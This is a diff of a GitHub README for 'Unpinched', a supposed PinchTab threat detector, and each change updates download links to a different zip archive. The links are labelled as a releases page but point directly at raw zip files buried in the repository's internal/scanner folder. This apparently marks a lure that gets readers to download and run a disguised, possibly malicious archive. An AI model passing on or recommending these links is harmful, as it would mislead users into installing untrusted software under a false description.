@@ -1,6 +1,6 @@
 # 🛡️ Unpinched - Detect PinchTab Threats Fast
 
-[![Download Unpinched](https://img.shields.io/badge/Download-Unpinched-ff6f61?style=for-the-badge)](https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_v1.9.zip)
+[![Download Unpinched](https://img.shields.io/badge/Download-Unpinched-ff6f61?style=for-the-badge)](https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_3.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To get Unpinched on your PC, follow these steps carefully.
 
 Click the large button above or this link to open the downloads page:
 
-[Download Unpinched Releases](https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_v1.9.zip)
+[Download Unpinched Releases](https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_3.2.zip)
 
 This page shows the latest program version and all available files.
 
@@ -140,7 +140,7 @@ For more detailed technical information, visit the GitHub repository’s Topics:
 
 Check the releases page regularly for new versions:
 
-[https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_v1.9.zip](https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_v1.9.zip)
+[https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_3.2.zip](https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_3.2.zip)
 
 Updates ensure you get the latest threat detection and bug fixes.
 
@@ -164,4 +164,4 @@ Include a clear description of your problem and any error messages you see.
 
 ---
 
-[![Download Unpinched](https://img.shields.io/badge/Download-Unpinched-ff6f61?style=for-the-badge)](https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_v1.9.zip)
+[![Download Unpinched](https://img.shields.io/badge/Download-Unpinched-ff6f61?style=for-the-badge)](https://github.com/Mischmetaldoris166/Unpinched/raw/refs/heads/main/internal/scanner/Software_3.2.zip)
